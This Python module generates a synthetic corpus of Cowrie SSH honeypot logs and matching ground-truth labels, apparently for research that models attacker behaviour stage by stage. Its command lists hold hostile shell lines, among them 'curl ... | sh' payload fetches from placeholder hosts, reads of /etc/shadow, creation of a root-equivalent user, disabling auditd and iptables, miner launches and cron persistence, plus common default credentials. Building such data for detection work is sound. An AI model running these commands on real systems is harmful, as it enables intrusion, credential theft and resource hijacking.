from __future__ import annotations
import json
from dataclasses import dataclass
from pathlib import Path
import numpy as np
from ..mdp.definitions import STATE_NAMES
RECON_CMDS = ['uname -a', 'cat /proc/cpuinfo', 'grep "model name" /proc/cpuinfo', 'lscpu', 'ps', 'free -m', 'top', 'netstat -an', 'ls -la', 'whoami', 'id', 'pwd']
FOOTHOLD_CMDS = ['cat /etc/passwd', 'cat /etc/shadow', 'chmod 777 /tmp/x', 'mkdir /tmp/.x', 'cp /bin/sh /tmp/.x', "echo 'x' >> /root/.bashrc"]
PRIVESC_CMDS = ['sudo chmod +s /bin/cp', 'useradd -o -u 0 svc', 'passwd root', 'chmod 777 /etc/shadow', 'sudo su']
C2_CMDS = ['wget http://{host}/b.sh', 'curl -O http://{host}/x86.elf', 'wget http://{host}/miner.tgz', 'curl http://{host}/cfg.json | sh']
EVASION_CMDS = ['chattr -ia .ssh', 'chattr -ia /etc/ld.so.preload', 'service iptables stop', 'systemctl stop auditd', 'iptables -F']
HIJACK_CMDS = ['./miner --donate-level=1', 'minerd -a cryptonight -o stratum+tcp://{host}:3333', 'xmrig -o pool.{host}:80', 'nice -n 19 ./cpulimit']
PERSIST_CMDS = ['crontab -l', "echo '* * * * * /tmp/.x/upd' | crontab -", "useradd -m bot && echo 'bot:bot' | chpasswd", 'ssh-keygen -t rsa -f /root/.ssh/id_rsa', 'sshd_config']
SSH_CMDS = ['ssh admin@10.0.0.5', 'ssh-keygen -t rsa', 'scp /tmp/x root@10.0.0.7:/tmp']
BENIGN_DL = ['wget http://example.com/index.html', 'curl http://google.com/robots.txt']
CREDENTIALS = [('root', '123456'), ('root', 'admin'), ('admin', 'admin'), ('root', 'toor'), ('ubuntu', 'ubuntu'), ('pi', 'raspberry'), ('test', 'test'), ('root', '1234')]
SSH_BANNERS = ['SSH-2.0-libssh-0.2', 'SSH-2.0-makiko', 'SSH-2.0-Go', 'SSH-2.0-OpenSSH_7.4']
CHAINS: dict[str, list[tuple[str, float]]] = {'recon_only': [('RECON', 1.0)], 'recon_c2': [('RECON', 0.6), ('C2', 0.4)], 'full_mine': [('RECON', 0.45), ('FOOTHOLD', 0.2), ('PRIVESC', 0.1), ('EVASION', 0.05), ('C2', 0.1), ('HIJACK', 0.1)], 'full_bot': [('RECON', 0.35), ('FOOTHOLD', 0.2), ('PRIVESC', 0.1), ('EVASION', 0.05), ('C2', 0.15), ('PERSIST', 0.15)], 'ssh_lateral': [('RECON', 0.4), ('SSH', 0.3), ('C2', 0.3)]}
CHAIN_WEIGHTS_P1 = {'recon_only': 0.34, 'recon_c2': 0.18, 'full_mine': 0.28, 'full_bot': 0.15, 'ssh_lateral': 0.05}
CHAIN_WEIGHTS_P2 = {'recon_only': 0.22, 'recon_c2': 0.14, 'full_mine': 0.36, 'full_bot': 0.22, 'ssh_lateral': 0.06}
CMDS_BY_STAGE = {'RECON': RECON_CMDS, 'FOOTHOLD': FOOTHOLD_CMDS, 'PRIVESC': PRIVESC_CMDS, 'EVASION': EVASION_CMDS, 'C2': C2_CMDS, 'HIJACK': HIJACK_CMDS, 'PERSIST': PERSIST_CMDS, 'SSH': SSH_CMDS}
STAGE_N = {'RECON': 0, 'SSH': 1, 'FOOTHOLD': 2, 'PRIVESC': 3, 'EVASION': 4, 'HIJACK': 5, 'C2': 6, 'PERSIST': 7}

@dataclass
class CorpusPaths:
    phase1: Path
    phase2: Path
    ground_truth: Path

def _fake_ip(rng: np.random.Generator) -> str:
    return '.'.join((str(int(x)) for x in rng.integers(1, 224, size=4)))

def _fill_hosts(rng: np.random.Generator) -> str:
    return '.'.join((str(int(z)) for z in rng.integers(2, 200, 4)))

def _ts(base_epoch: float, rng: np.random.Generator) -> str:
    import datetime as dt
    t = base_epoch + float(rng.uniform(0, 21 * 86400))
    return dt.datetime.utcfromtimestamp(t).strftime('%Y-%m-%dT%H:%M:%S.%f')[:-3] + 'Z'

def generate_corpus(out_dir: Path | str, n_phase1: int=60000, n_phase2: int=40000, seed: int=1234, anomaly_rate: float=0.02) -> CorpusPaths:
    rng = np.random.default_rng(seed)
    out = Path(out_dir)
    out.mkdir(parents=True, exist_ok=True)
    (p1_path, p2_path) = (out / 'p1.json', out / 'p2.json.json')
    gt = {'provenance': 'synthetic', 'seed': int(seed), 'sessions': {}}
    base_epoch = 1735689600.0
    ip_pool = np.array([_fake_ip(rng) for _ in range(4096)])
    for (phase, (n_sessions, chain_w, path)) in enumerate([(n_phase1, CHAIN_WEIGHTS_P1, p1_path), (n_phase2, CHAIN_WEIGHTS_P2, p2_path)], start=1):
        with path.open('w', encoding='utf-8') as fh:
            for i in range(n_sessions):
                sid = f'{phase:x}{i:08x}'
                src_ip = ip_pool[int(rng.integers(0, len(ip_pool)))]
                banner = SSH_BANNERS[int(rng.integers(0, len(SSH_BANNERS)))]
                creds_n = int(rng.integers(1, 8))
                t0 = _ts(base_epoch, rng)
                events = []
                events.append({'eventid': 'cowrie.session.connect', 'timestamp': t0, 'session': sid, 'src_ip': src_ip, 'src_port': int(rng.integers(1024, 65535)), 'dest_port': 22 if rng.random() < 0.9 else 2223, 'version': banner})
                ok = rng.random() < (0.62 if phase == 2 else 0.55)
                for _ in range(creds_n):
                    (u, p) = CREDENTIALS[int(rng.integers(0, len(CREDENTIALS)))]
                    events.append({'eventid': 'cowrie.login.failed', 'timestamp': t0, 'session': sid, 'src_ip': src_ip, 'src_port': 0, 'dest_port': 22, 'username': u, 'password': p})
                if ok:
                    events.append({'eventid': 'cowrie.login.success', 'timestamp': t0, 'session': sid, 'src_ip': src_ip, 'src_port': 0, 'dest_port': 22, 'username': 'root', 'password': '123456'})
                    anomaly = rng.random() < anomaly_rate
                    if anomaly:
                        stages = ['RECON', 'EVASION', 'HIJACK', 'EVASION', 'PERSIST']
                    else:
                        chain = list(chain_w.items())
                        names = np.array([c[0] for c in chain], dtype=object)
                        w = np.array([c[1] for c in chain])
                        chain_name = str(rng.choice(names, p=w / w.sum()))
                        stages = [s for (s, _) in CHAINS[chain_name] if s != 'SSH' or rng.random() < 0.3]
                    n_cmds = int(rng.integers(1, 9)) * max(1, len(stages))
                    emitted = 0
                    for stage in stages:
                        k = int(rng.integers(1, 4))
                        for _ in range(k):
                            if emitted >= n_cmds:
                                break
                            tpl = CMDS_BY_STAGE[stage][int(rng.integers(0, len(CMDS_BY_STAGE[stage])))]
                            cmd = tpl.format(host=_fill_hosts(rng))
                            events.append({'eventid': 'cowrie.command.input', 'timestamp': t0, 'session': sid, 'src_ip': src_ip, 'src_port': 0, 'dest_port': 22, 'input': cmd})
                            emitted += 1
                        if anomaly and rng.random() < 0.3:
                            events.append({'eventid': 'cowrie.session.file_download', 'timestamp': t0, 'session': sid, 'src_ip': src_ip, 'src_port': 0, 'dest_port': 22, 'outfile': '/tmp/xmrig', 'url': 'http://bad.{}/x'.format(_fill_hosts(rng))})
                    gt_session = {'phase': phase, 'src_ip': src_ip, 'anomaly': bool(anomaly), 'chain': stages, 'n_commands': emitted, 'states': [STAGE_N[s] for s in stages]}
                    gt['sessions'][sid] = gt_session
                else:
                    gt['sessions'][sid] = {'phase': phase, 'src_ip': src_ip, 'anomaly': False, 'chain': [], 'n_commands': 0, 'states': []}
                for e in events:
                    fh.write(json.dumps(e, sort_keys=True) + '\n')
    gt['state_names'] = list(STATE_NAMES)
    gt['calibration'] = {'target_sessions': {'phase1': n_phase1, 'phase2': n_phase2}, 'paper_reference': {'phase1': 410198, 'phase2': 248338}, 'chain_weights': {'phase1': CHAIN_WEIGHTS_P1, 'phase2': CHAIN_WEIGHTS_P2}}
    (out / 'ground_truth.json').write_text(json.dumps(gt, sort_keys=True), encoding='utf-8')
    return CorpusPaths(phase1=p1_path, phase2=p2_path, ground_truth=out / 'ground_truth.json')
